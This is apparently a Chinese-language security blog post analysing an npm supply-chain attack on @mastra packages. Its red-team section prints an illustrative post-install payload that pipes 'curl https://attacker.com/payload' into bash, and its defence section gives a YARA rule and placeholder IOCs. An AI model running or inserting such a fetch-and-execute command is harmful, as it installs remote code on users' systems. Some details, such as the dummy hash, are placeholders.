---
layout: post
title:  "Microsoft links Mastra AI supply chain attack to North Korean hackers"
date:   2026-06-20 19:14:39 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Sapphire Sleet 的 npm 供應鏈攻擊：技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Typosquatting, Malicious Dependency, Post-Install Hook

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 npm 供應鏈的漏洞，通過 compromisement 的 npm maintainer 帳戶 "ehindero"，發佈惡意的 package 更新。
* **攻擊流程圖解**:
  1. 攻擊者 compromisement npm maintainer 帳戶 "ehindero"。
  2. 攻擊者發佈惡意的 package 更新，包含 malicious dependency "easy-day-js"。
  3. 使用者安裝受影響的 package。
  4. easy-day-js 執行 post-install hook，下載並執行惡意 payload。
* **受影響元件**: npm package @mastra/*，版本號未指定。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: npm maintainer 帳戶的 compromisement。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // easy-day-js payload 範例
    const { exec } = require('child_process');
    exec('curl -s https://attacker.com/payload | bash', (error, stdout, stderr) => {
      if (error) {
        console.error(`exec error: ${error}`);
        return;
      }
      console.log(`stdout: ${stdout}`);
      console.log(`stderr: ${stderr}`);
    });
    
    ```
* **繞過技術**: 使用 typosquatting 技術，創建一個與合法 package 名稱類似的惡意 package。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | attacker.com | /usr/local/lib/node_modules/easy-day-js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_easy_day_js {
      meta:
        description = "Detects malicious easy-day-js payload"
      strings:
        $a = "curl -s https://attacker.com/payload | bash"
      condition:
        $a
    }
    
    ```
* **緩解措施**: 更新 npm package 版本，移除惡意 dependency。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Typosquatting (輸入法錯誤)**: 想像使用者輸入錯誤的網址或 package 名稱。技術上是指創建一個與合法名稱類似的惡意名稱，利用使用者的輸入錯誤進行攻擊。
* **Malicious Dependency (惡意依賴)**: 想像一個 package 中包含惡意的依賴。技術上是指 package 中包含惡意的依賴，當使用者安裝 package 時，惡意依賴也會被安裝。
* **Post-Install Hook (安裝後鉤子)**: 想像一個 package 安裝完成後執行的腳本。技術上是指 package 安裝完成後執行的腳本，通常用於配置或初始化 package。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/microsoft-links-mastra-ai-supply-chain-attack-to-north-korean-hackers/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


